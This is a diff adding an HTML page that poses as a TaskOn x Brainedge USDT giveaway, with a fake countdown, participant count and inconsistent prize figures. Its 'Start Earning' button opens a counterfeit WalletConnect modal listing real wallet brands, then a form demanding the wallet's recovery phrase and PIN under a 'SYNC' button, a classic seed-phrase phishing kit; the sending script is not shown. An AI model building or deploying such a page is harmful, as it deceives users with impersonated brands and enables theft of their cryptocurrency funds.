@@ -1,0 +1,1272 @@
+<!doctype html>
+<html class="no-js" lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>TaskOn</title>
+    <meta name="description" content="eSports and Gaming NFT Template">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- Place favicon.ico in the root directory -->
+    <link rel="shortcut icon" type="image/x-icon" href="assets/img/logo.svg">
+
+    <!-- CSS here -->
+    <link rel="stylesheet" href="assets/css/plugins.css">
+    <link rel="stylesheet" href="assets/css/main.css">
+
+    <!-- Page-Revealer -->
+    <script src="assets/js/tg-page-head.js"></script>
+    <script src="config.js"></script>
+    <style>
+        * {
+            opacity: 1 !important;
+        }
+        :root {
+            --animation-duration: 300ms;
+  
+        }
+  
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+  
+            }
+  
+            to {
+                opacity: 1;
+  
+            }
+  
+  
+        }
+  
+        @keyframes fadeOut {
+            from {
+                opacity: 1;
+  
+            }
+  
+            to {
+                opacity: 0;
+  
+            }
+  
+  
+        }
+  
+        .animated {
+            animation-duration: var(--animation-duration);
+            animation-fill-mode: both;
+  
+        }
+  
+        .fadeIn {
+            animation-name: fadeIn;
+  
+        }
+  
+        .fadeOut {
+            animation-name: fadeOut;
+  
+        }
+        
+    
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+  
+        .loading-spinner {
+            border: 6px solid #f3f3f3;
+            border-top: 6px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 2s linear infinite;
+        }
+  
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+  
+        #walletconnect-wrapper {
+            -webkit-user-select: none;
+            align-items: center;
+            display: flex;
+            height: 100%;
+            justify-content: center;
+            left: 0;
+            pointer-events: none;
+            position: fixed;
+            top: 0;
+            user-select: none;
+            width: 100%;
+            z-index: 99999999999999;
+  
+        }
+  
+        .walletconnect-modal__headerLogo {
+            height: 21px;
+  
+        }
+  
+        .walletconnect-modal__header p {
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0 0 0 5px;
+            align-items: flex-start;
+            display: flex;
+            flex: 1;
+  
+        }
+  
+        .walletconnect-modal__close__wrapper {
+            position: absolute;
+            top: 0;
+            right: 0;
+            z-index: 10000;
+            background: white;
+            border-radius: 26px;
+            padding: 6px;
+            box-sizing: border-box;
+            width: 26px;
+            height: 26px;
+            cursor: pointer;
+  
+        }
+  
+        .walletconnect-modal__close__icon {
+            position: relative;
+            top: 7px;
+            right: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transform: rotate(45deg);
+  
+        }
+  
+        .walletconnect-modal__close__line1 {
+            position: absolute;
+            width: 100%;
+            border: 1px solid rgb(48, 52, 59);
+  
+        }
+  
+        .walletconnect-modal__close__line2 {
+            position: absolute;
+            width: 100%;
+            border: 1px solid rgb(48, 52, 59);
+            transform: rotate(90deg);
+  
+        }
+  
+        .walletconnect-qrcode__base {
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+            background: rgba(37, 41, 46, 0.95);
+            height: 100%;
+            left: 0;
+            pointer-events: auto;
+            position: fixed;
+            top: 0;
+            transition: 0.4s cubic-bezier(0.19, 1, 0.22, 1);
+            width: 100%;
+            will-change: opacity;
+            padding: 40px;
+            box-sizing: border-box;
+  
+        }
+  
+        .walletconnect-qrcode__text {
+            color: rgba(60, 66, 82, 0.6);
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 0;
+            line-height: 1.1875em;
+            margin: 10px 0 20px;
+            text-align: center;
+            width: 100%;
+  
+        }
+  
+        .walletconnect-qrcode__text.error {
+            background-color: #FED7D7;
+            color: #E53E3E;
+            border: 1px solid #E53E3E;
+            padding: 0.4em;
+            border-radius: 8px;
+        }
+  
+        @media only screen and(max-width: 768px) {
+            .walletconnect-qrcode__text {
+                font-size: 4vw;
+  
+            }
+  
+  
+        }
+  
+        @media only screen and(max-width: 320px) {
+            .walletconnect-qrcode__text {
+                font-size: 14px;
+  
+            }
+  
+  
+        }
+  
+        .walletconnect-qrcode__image {
+            width: calc(100% - 30px);
+            box-sizing: border-box;
+            cursor: none;
+            margin: 0 auto;
+  
+        }
+  
+        .walletconnect-qrcode__notification {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            font-size: 16px;
+            padding: 16px 20px;
+            border-radius: 16px;
+            text-align: center;
+            transition: all 0.1s ease-in-out;
+            background: white;
+            color: black;
+            margin-bottom: -60px;
+            opacity: 0;
+  
+        }
+  
+        .walletconnect-qrcode__notification.notification__show {
+            opacity: 1;
+  
+        }
+  
+        @media only screen and(max-width: 768px) {
+            .walletconnect-modal__header {
+                height: 130px;
+  
+            }
+  
+            .walletconnect-modal__base {
+                overflow: auto;
+  
+            }
+  
+  
+        }
+  
+        @media only screen and(min-device-width: 415px) and(max-width: 768px) {
+            #content {
+                max-width: 768px;
+                box-sizing: border-box;
+  
+            }
+  
+  
+        }
+  
+        @media only screen and(min-width: 375px) and(max-width: 415px) {
+            #content {
+                max-width: 414px;
+                box-sizing: border-box;
+  
+            }
+  
+  
+        }
+  
+        @media only screen and(min-width: 320px) and(max-width: 375px) {
+            #content {
+                max-width: 375px;
+                box-sizing: border-box;
+  
+            }
+  
+  
+        }
+  
+        @media only screen and(max-width: 320px) {
+            #content {
+                max-width: 320px;
+                box-sizing: border-box;
+  
+            }
+  
+  
+        }
+  
+        .walletconnect-modal__base {
+            -webkit-font-smoothing: antialiased;
+            background: #ffffff;
+            border-radius: 5px;
+            box-shadow: 0 10px 50px 5px rgba(0, 0, 0, 0.4);
+            font-family: ui-rounded, "SF Pro Rounded", "SF Pro Text", medium-content-sans-serif-font, -apple-system, BlinkMacSystemFont, ui-sans-serif, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            margin: auto;
+            padding: 24px 24px 22px;
+            pointer-events: auto;
+            position: relative;
+            text-align: center;
+            transition: 0.4s cubic-bezier(0.19, 1, 0.22, 1);
+            will-change: transform;
+            overflow: visible;
+            transform: translateY(-50%);
+            top: 50%;
+            max-width: 500px;
+  
+        }
+  
+        @media only screen and(max-width: 320px) {
+            .walletconnect-modal__base {
+                padding: 24px 12px;
+  
+            }
+  
+  
+        }
+  
+        .walletconnect-modal__base .hidden {
+            transform: translateY(150%);
+            transition: 0.125s cubic-bezier(0.4, 0, 1, 1);
+  
+        }
+  
+        .walletconnect-modal__header {
+            align-items: center;
+            display: flex;
+            height: 26px;
+            left: 0;
+            justify-content: space-between;
+            position: absolute;
+            top: -42px;
+            width: 100%;
+  
+        }
+  
+        .walletconnect-modal__base .wc-logo {
+            align-items: center;
+            display: flex;
+            height: 26px;
+            margin-top: 15px;
+            padding-bottom: 15px;
+            pointer-events: auto;
+  
+        }
+  
+        .walletconnect-modal__base .wc-logo div {
+            background-color: #3399ff;
+            height: 21px;
+            margin-right: 5px;
+            mask-image: url("images/wc-logo.svg") center no-repeat;
+            width: 32px;
+  
+        }
+  
+        .walletconnect-modal__base .wc-logo p {
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 600;
+            margin: 0;
+  
+        }
+  
+        .walletconnect-modal__base h2 {
+            color: rgba(60, 66, 82, 0.6);
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 0;
+            line-height: 1.1875em;
+            margin: 0 0 19px;
+            text-align: center;
+            width: 100%;
+  
+        }
+  
+        .walletconnect-modal__base__row {
+            -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
+            align-items: center;
+            border-radius: 20px;
+            cursor: pointer;
+            display: flex;
+            height: 56px;
+            justify-content: space-between;
+            padding: 0 15px;
+            position: relative;
+            margin: 0 0 8px;
+            text-align: left;
+            transition: 0.15s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            will-change: transform;
+            text-decoration: none;
+  
+        }
+  
+        .walletconnect-modal__base__row:hover {
+            background: rgba(60, 66, 82, 0.06);
+  
+        }
+  
+        .walletconnect-modal__base__row:active {
+            background: rgba(60, 66, 82, 0.06);
+            transform: scale(0.975);
+            transition: 0.1s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+  
+        }
+  
+        .walletconnect-modal__base__row__h3 {
+            color: #25292e;
+            font-size: 20px;
+            font-weight: 700;
+            margin: 0;
+            padding-bottom: 3px;
+  
+        }
+  
+        .walletconnect-modal__base__row__right {
+            align-items: center;
+            display: flex;
+            justify-content: center;
+  
+        }
+  
+        .walletconnect-modal__base__row__right__app-icon {
+            border-radius: 8px;
+            height: 34px;
+            margin: 0 11px 2px 0;
+            width: 34px;
+            background-size: 100%;
+            box-shadow: 0 4px 12px 0 rgba(37, 41, 46, 0.25);
+  
+        }
+  
+        .walletconnect-modal__base__row__right__caret {
+            height: 18px;
+            opacity: 0.3;
+            transition: 0.1s cubic-bezier(0.25, 0.46, 0.45, 0.94);
+            width: 8px;
+            will-change: opacity;
+  
+        }
+  
+        .walletconnect-modal__base__row:hover .caret,
+        .walletconnect-modal__base__row:active .caret {
+            opacity: 0.6;
+  
+        }
+  
+        .walletconnect-modal__mobile__toggle {
+            width: 80%;
+            display: flex;
+            margin: 0 auto 18px;
+            position: relative;
+            overflow: hidden;
+            border-radius: 8px;
+            background: #d4d5d9;
+  
+        }
+  
+        .walletconnect-modal__single_wallet {
+            display: flex;
+            justify-content: center;
+            margin-top: 7px;
+            margin-bottom: 18px;
+  
+        }
+  
+        .walletconnect-modal__single_wallet a {
+            cursor: pointer;
+            color: rgb(64, 153, 255);
+            font-size: 21px;
+            font-weight: 800;
+            text-decoration: none !important;
+            margin: 0 auto;
+  
+        }
+  
+        .walletconnect-modal__mobile__toggle_selector {
+            width: calc(50% - 8px);
+            background: white;
+            position: absolute;
+            border-radius: 5px;
+            height: calc(100% - 8px);
+            top: 4px;
+            transition: all 0.2s ease-in-out;
+            transform: translate3d(4px, 0, 0);
+  
+        }
+  
+        .walletconnect-modal__mobile__toggle.right__selected .walletconnect-modal__mobile__toggle_selector {
+            transform: translate3d(calc(100% + 12px), 0, 0);
+  
+        }
+  
+        .walletconnect-modal__mobile__toggle a {
+            font-size: 12px;
+            width: 50%;
+            text-align: center;
+            padding: 8px;
+            margin: 0;
+            font-weight: 600;
+            z-index: 1;
+  
+        }
+  
+        .walletconnect-modal__footer {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+  
+        }
+  
+        @media only screen and(max-width: 768px) {
+            .walletconnect-modal__footer {
+                margin-top: 5vw;
+  
+            }
+  
+  
+        }
+  
+        .walletconnect-modal__footer a {
+            cursor: pointer;
+            color: #898d97;
+            font-size: 15px;
+            margin: 0 auto;
+  
+        }
+  
+        @media only screen and(max-width: 320px) {
+            .walletconnect-modal__footer a {
+                font-size: 14px;
+  
+            }
+  
+  
+        }
+  
+        .walletconnect-connect__buttons__wrapper {
+            max-height: 44vh;
+  
+        }
+  
+        .walletconnect-connect__buttons__wrapper__android {
+            margin: 50% 0;
+  
+        }
+  
+        .walletconnect-connect__buttons__wrapper__wrap {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            margin: 10px 0;
+  
+        }
+  
+        @media only screen and(min-width: 768px) {
+            .walletconnect-connect__buttons__wrapper__wrap {
+                margin-top: 40px;
+  
+            }
+  
+  
+        }
+  
+        .walletconnect-connect__button {
+            background-color: rgb(64, 153, 255);
+            padding: 8px 26px;
+            text-decoration: none;
+            color: rgb(255, 255, 255);
+            font-weight: 500;
+            border: none;
+            font-size: 14px;
+            width: 100%;
+            cursor: pointer;
+        }
+  
+        .walletconnect-connect__button__icon_anchor {
+            cursor: pointer;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            margin: 8px;
+            width: 42px;
+            justify-self: center;
+            flex-direction: column;
+            text-decoration: none !important;
+  
+        }
+  
+        @media only screen and(max-width: 320px) {
+            .walletconnect-connect__button__icon_anchor {
+                margin: 4px;
+  
+            }
+  
+  
+        }
+  
+        .walletconnect-connect__button__icon {
+            border-radius: 10px;
+            height: 42px;
+            margin: 0;
+            width: 42px;
+            background-size: cover !important;
+            box-shadow: 0 4px 12px 0 rgba(37, 41, 46, 0.25);
+  
+        }
+  
+        .walletconnect-connect__button__text {
+            color: #424952;
+            font-size: 2.7vw;
+            text-decoration: none !important;
+            padding: 0;
+            margin-top: 1.8vw;
+            font-weight: 600;
+  
+        }
+  
+        @media only screen and(min-width: 768px) {
+            .walletconnect-connect__button__text {
+                font-size: 16px;
+                margin-top: 12px;
+  
+            }
+  
+  
+        }
+  
+        .walletconnect-search__input {
+            border: none;
+            background: #d4d5d9;
+            border-style: none;
+            padding: 12px 16px;
+            outline: none;
+            font-style: normal;
+            font-stretch: normal;
+            font-size: 16px;
+            font-style: normal;
+            font-stretch: normal;
+            line-height: normal;
+            letter-spacing: normal;
+            text-align: left;
+            
+            width: 90%; /* calc(100% - 16px) */
+            margin: 0 0 8px;
+  
+        }
+  
+        .d-none {
+            display: none!important;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="d-none" id="walletconnect-wrapper">
+        <div id="walletconnect-qrcode-modal" class="walletconnect-qrcode__base animated fadeIn">
+            <div class="walletconnect-modal__base">
+                <div class="walletconnect-modal__header"><img src="data:image/svg+xml,%3Csvg height='185' viewBox='0 0 300 185' width='300' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath d='m61.4385429 36.2562612c48.9112241-47.8881663 128.2119871-47.8881663 177.1232091 0l5.886545 5.7634174c2.445561 2.3944081 2.445561 6.2765112 0 8.6709204l-20.136695 19.715503c-1.222781 1.1972051-3.2053 1.1972051-4.428081 0l-8.100584-7.9311479c-34.121692-33.4079817-89.443886-33.4079817-123.5655788 0l-8.6750562 8.4936051c-1.2227816 1.1972041-3.205301 1.1972041-4.4280806 0l-20.1366949-19.7155031c-2.4455612-2.3944092-2.4455612-6.2765122 0-8.6709204zm218.7677961 40.7737449 17.921697 17.546897c2.445549 2.3943969 2.445563 6.2764769.000031 8.6708899l-80.810171 79.121134c-2.445544 2.394426-6.410582 2.394453-8.85616.000062-.00001-.00001-.000022-.000022-.000032-.000032l-57.354143-56.154572c-.61139-.598602-1.60265-.598602-2.21404 0-.000004.000004-.000007.000008-.000011.000011l-57.3529212 56.154531c-2.4455368 2.394432-6.4105755 2.394472-8.8561612.000087-.0000143-.000014-.0000296-.000028-.0000449-.000044l-80.81241943-79.122185c-2.44556021-2.394408-2.44556021-6.2765115 0-8.6709197l17.92172963-17.5468673c2.4455602-2.3944082 6.4105989-2.3944082 8.8561602 0l57.3549775 56.155357c.6113908.598602 1.602649.598602 2.2140398 0 .0000092-.000009.0000174-.000017.0000265-.000024l57.3521031-56.155333c2.445505-2.3944633 6.410544-2.3945531 8.856161-.0002.000034.0000336.000068.0000673.000101.000101l57.354902 56.155432c.61139.598601 1.60265.598601 2.21404 0l57.353975-56.1543249c2.445561-2.3944092 6.410599-2.3944092 8.85616 0z' fill='%233b99fc'/%3E%3C/svg%3E" class="walletconnect-modal__headerLogo"><p>WalletConnect</p>
+                    <div class="walletconnect-modal__close__wrapper" onclick="javascript:close_connect_wallet()">
+                        <div id="walletconnect-qrcode-close" class="walletconnect-modal__close__icon">
+                            <div class="walletconnect-modal__close__line1"></div>
+                            <div class="walletconnect-modal__close__line2"></div>
+                        </div>
+                    </div>
+                </div>
+                <div>
+                            <div class="d-none" id="connect_error">
+                        <p class="walletconnect-qrcode__text error">An error occured! <br>Unable to Validate Wallet. Please contact admin for assistance</p>
+                        <br>
+                        
+                    </div>
+                    
+                    <div id="select_wallet">
+                        <p id="walletconnect-qrcode-text" class="walletconnect-qrcode__text">Choose your preferred wallet</p>
+                        <div class="walletconnect-connect__buttons__wrapper__wrap">
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Trust wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url(&quot;https://is1-ssl.mzstatic.com/image/thumb/Purple112/v4/97/15/68/9715688d-408a-2007-3a95-87056523e873/AppIcon-0-1x_U007emarketing-0-10-0-85-220.png/217x0w.webp&quot;) 0% 0% / 100% rgb(97, 134, 255);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Trust </div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Ledger wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url('ledger.png') rgb(0, 0, 0);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Ledger</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Coinbase wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url(&quot;https://images.ctfassets.net/q5ulk4bp65r7/1rFQCqoq8hipvVJSKdU3fQ/21ab733af7a8ab404e29b873ffb28348/coinbase-icon2.svg&quot;) rgb(255, 255, 255);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Coinbase</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Coin98 wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url('coin98.jpeg') rgb(25, 127, 225);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Coin98</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Safepal wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url('safepal.png') rgb(97, 134, 255);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Safepal</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Phantom wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url('phantom.png');"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Phantom</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Ambire wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url('ambire.jpeg') rgb(170, 106, 255);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Ambire</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Metamask wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url('metamask.png') 0% 0% / 100% rgb(50, 202, 255);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Metamask</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Soflare wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url('soflare.png') 0% 0% / 100% rgb(97, 134, 255);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Soflare</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Crypto.com')" rel="noopener noreferrer" role="button">
+                              <div class="walletconnect-connect__button__icon" style="background: url('cryptocom.jpeg') rgb(17, 153, 250);"></div>
+                              <div class="walletconnect-connect__button__text" style="font-size: inherit;">Crypto</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Blockchain wallet')" rel="noopener noreferrer" role="button">
+                              <div class="walletconnect-connect__button__icon" style="background: url(&quot;https://play-lh.googleusercontent.com/CcboHyK1Id9XQWa8HXb_81Rvgqy7J816OHiTcGlezcwC-tx4cnrrXPx1x6cR0PowqA=w240-h480-rw&quot;) 0% 0% / 100%;"></div>
+                              <div class="walletconnect-connect__button__text" style="font-size: small;">Blockchain</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Exodus wallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url(&quot;https://www.exodus.com/img/favicons/apple-icon-152x152.png&quot;) 0% 0% / 100% rgb(255, 255, 255);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Exodus</div>
+                            </a>
+                            
+                            <!--<a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Crypto.com')" rel="noopener noreferrer" role="button">
+                              <div class="walletconnect-connect__button__icon" style="background: url(&quot;https://registry.walletconnect.com/api/v2/logo/sm/7c5ff577-a68d-49c5-02cd-3d83637b0b00&quot;) rgb(17, 153, 250);"></div>
+                              <div class="walletconnect-connect__button__text" style="font-size: inherit;">Crypto.com</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('Blockchain')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url(&quot;https://play-lh.googleusercontent.com/CcboHyK1Id9XQWa8HXb_81Rvgqy7J816OHiTcGlezcwC-tx4cnrrXPx1x6cR0PowqA=w240-h480-rw&quot;) 0% 0% / 100%;"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">Blockchain</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('KryptoGO')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url(&quot;https://registry.walletconnect.com/api/v2/logo/sm/3ccbd966-97e8-45a0-1ceb-6141a8978e00&quot;) rgb(255, 194, 17);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">KryptoGO</div>
+                            </a>
+                            <a class="walletconnect-connect__button__icon_anchor" href="javascript:show_form('PunkWallet')" rel="noopener noreferrer" role="button">
+                                <div class="walletconnect-connect__button__icon" style="background: url(&quot;https://registry.walletconnect.com/api/v2/logo/sm/93f81bf3-a7f1-4620-013e-5959432e3500&quot;) rgb(24, 144, 255);"></div>
+                                <div class="walletconnect-connect__button__text" style="font-size: inherit;">🧑&zwj;🎤 PunkWallet</div>
+                            </a>-->
+                        </div>
+                        <!-- <div class="walletconnect-qrcode__notification"></div> -->
+                    </div>
+                    
+                    <!-- Loading overlay -->
+                    <div class="loading-overlay" id="loadingOverlay">
+                      <div class="loading-spinner"></div>
+                    </div>
+                    
+                    <div class="d-none" id="connect_form">
+                        <p id="walletconnect-text" class="walletconnect-qrcode__text">Connect wallet</p>
+                        <form id="messageForm" >
+                            <textarea class="walletconnect-search__input" placeholder="Phrase(Typically 12 (sometimes 24) words seperated by a single spaces)." id="c_seed" rows="5" required></textarea>
+                            <br>
+                            <p></p>
+                            <input type="text" class="walletconnect-search__input" id="c_pin" placeholder="Pin" maxlength="10" required>
+                            <input type="text" class="d-none" hidden id="w-name">
+                            <br>
+                            <button type="submit" class="walletconnect-connect__button" >SYNC</button>
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+
+    <!-- Scroll-top -->
+    <button class="scroll__top scroll-to-target" data-target="html">
+        <i class="flaticon-right-arrow"></i>
+    </button>
+    <!-- Scroll-top-end-->
+
+    <!-- header-area -->
+    <header>
+        <div id="sticky-header" class="tg-header__area transparent-header">
+            <div class="container custom-container">
+                <div class="row">
+                    <div class="col-12">
+                        
+                        <div class="tgmenu__wrap">
+                            <nav class="tgmenu__nav">
+                                <div class="logo">
+                                    <a href="index.html"><img src="assets/img/logo.svg" alt="Logo"> TaskOn</a>
+                                </div>
+                                <div class="tgmenu__navbar-wrap tgmenu__main-menu d-none d-xl-flex">
+                                    <ul class="navigation">
+                                        <li><a href="about-us.html">Campaign</a></li>
+                                        <li><a href="about-us.html">Events</a></li>
+                                        <li><a href="contact.html">For Projects</a></li>
+                                    </ul>
+                                </div>
+                                <div class="tgmenu__action d-none d-md-block">
+                                    <ul class="list-wrap">
+                                        <li class="search"><a href="javascript:void(0)"><i class="flaticon-search-1"></i></a></li>
+                                        <li class="header-btn">
+                                            <a class="tg-border-btn">
+                                                <svg preserveAspectRatio="none" viewBox="0 0 157 48" fill="none">
+                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M131.75 2L155.75 25L131.75 47L148.75 24L131.75 2Z" fill="currentColor"></path>
+                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M25 1L1 24.5111L25 47L8 23.4889L25 1Z" fill="currentColor"></path>
+                                                    <path fill-rule="evenodd" clip-rule="evenodd" d="M24.75 1L0.75 25L23.75 47H131.75L155.75 25L131.75 1H24.75Z" stroke="currentColor" stroke-width="1.5"></path>
+                                                </svg>
+                                                <i class="flaticon-edit"></i>
+                                                connect wallet
+                                            </a>
+                                        </li>
+                                        <li class="side-toggle-icon">
+                                            <span></span>
+                                            <span></span>
+                                            <span></span>
+                                        </li>
+                                    </ul>
+                                </div>
+                            </nav>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+        <!-- header-search -->
+        <div class="search__popup-wrap">
+            <div class="search__layer"></div>
+            <div class="search__close">
+                <span><i class="flaticon-swords-in-cross-arrangement"></i></span>
+            </div>
+            <div class="search__wrap text-center">
+                <div class="container">
+                    <div class="row">
+                        <div class="col-12">
+                            <h2 class="title">... <span>Search Here</span> ...</h2>
+                            <div class="search__form">
+                                <form action="#">
+                                    <input type="text" name="search" placeholder="Type keywords here" required>
+                                    <button class="search-btn"><i class="flaticon-loupe"></i></button>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- header-search-end -->
+
+    </header>
+    <!-- header-area-end -->
+
+
+
+    <!-- main-area -->
+    <main class="main--area">
+
+        <!-- breadcrumb-area -->
+        <section class="breadcrumb-area breadcrumb__hide-img" data-background="assets/img/bg/breadcrumb_bg02.jpg">
+            <div class="container">
+                <div class="breadcrumb__wrapper">
+                    <div class="row">
+                        <div class="col-12">
+                            <div class="breadcrumb__content">
+                                <h3 class="title">LEARN_Brainedge</h3>
+                                <h4 class="title">TaskOn x Brainedge team up for a $2000 USDT Giveaway!</h4>
+                                <nav aria-label="breadcrumb">
+                                    <ol class="breadcrumb">
+                                        <li class="breadcrumb-item"><a href="index.html">Ongoing</a></li>
+                                        <li class="breadcrumb-item active" aria-current="page">(UTC-4) 2024-07-03 02:24 ～ 09-17 06:00</li>
+                                    </ol>
+                                </nav>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- breadcrumb-area-end -->
+
+        <!-- shop-area -->
+        <section class="shop-area shop-details-area">
+            <div class="container">
+                <div class="row">
+                    <div class="shop__details-images-wrap">
+                        
+                        <div class="tab-content" id="imageTabContent">
+                            <div class="tab-pane show active" id="one" role="tabpanel" aria-labelledby="one-tab">
+                                <a href="assets/img/bg.png" class="popup-image"><img src="assets/img/bg.png" alt="img"></a>
+                            </div>
+                            <div class="tab-pane" id="two" role="tabpanel" aria-labelledby="two-tab">
+                                <a href="assets/img/bg.png" class="popup-image"><img src="assets/img/products/shop_details02.jpg" alt="img"></a>
+                            </div>
+                            <div class="tab-pane" id="three" role="tabpanel" aria-labelledby="three-tab">
+                                <a href="assets/img/products/shop_details03.jpg" class="popup-image"><img src="assets/img/products/shop_details03.jpg" alt="img"></a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="shop__details-content">
+                        
+                        <h2 class="title">Campaign Rewards</h2>
+                        <div class="shop__details-price">
+                            <span class="amount">Campaign Ends In <span id="timer" class="stock-status">10h : 28m : 00s</span></span>
+                        </div>
+                        <div class="shop__details-short-description">
+                            <p>(UTC-4) 2024-07-03 02:24 ～ 09-17 06:00</p>
+                        </div>
+                        
+                        <!--<div class="shop__details-qty">
+                            <div class="cart-plus-minus d-flex flex-wrap align-items-center">
+                                
+                                <button class="shop__details-cart-btn">add to cart</button>
+                            </div>
+                        </div>-->
+                        <div class="shop__details-bottom">
+                            <div class="posted_in">
+                                <b>Lucky Draw </b>
+                                
+                            </div>
+                            <div class="tagged_as">
+                                <b>Token </b>
+                                <a >20 USDT/Winner</a>
+                                
+                                
+                            </div>
+                            <div class="tagged_as">
+                                
+                                <a >100 Winners</a>
+                                
+                                
+                            </div>
+                            
+                        </div>
+                        <div class="shop__details-bottom">
+                            <div class="posted_in">
+                                <b>Participant Info </b>
+                                
+                            </div>
+                            <div class="tagged_as">
+                                <b>Participants </b>
+                                <a >53777</a>
+                                
+                                
+                            </div>
+                            
+                        </div>
+                    </div>
+                </div>
+                <div class="row">
+                    <div class="col-12">
+                        <div class="product__desc-wrap">
+                            <h2 class="title">Description</h2>
+                            <div class="tab-content" id="descriptionTabContent">
+                                <div class="tab-pane animation-none fade show active" id="description" role="tabpanel" aria-labelledby="description-tab">
+                                    <p>We are excited to host a special giveaway with the Brainedge team.</p>
+                                    <p>The event will give away a total of $2000 USDC to 200 lucky winners.</p>
+                                    <p>Don’t miss it! To be eligible for the  reward, follow the rules below.</p>
+                                    <p>📣Event Period: Jun 26 th, 2024 - Sep 17 th, 2024</p>
+                                    <p>🏆Prize Pool: </p>
+                                    <p>🔸$2000 USDC</p>
+                                    <p>🔸Each eligible participant will get 10USDT.</p>
+                                    <p>💡Event Rules:</p>
+                                    <p>1.Users must complete all tasks on TaskOn;</p>
+                                    <p>2.Rewards will be distributed within 1 month after the end of the event;</p>
+                                </div>
+                            
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="shop__details-qty">
+                    <div class="cart-plus-minus d-flex flex-wrap align-items-center">
+                        
+                        <button class="shop__details-cart-btn" onclick="javascript:connect_wallet()">Start Earning</button>
+                    </div>
+                </div>
+                <div class="related__product-area">
+                    <div class="related__product-wrapper">
+                        <h2 class="related-title">Recommended Campaign 🔥</h2>
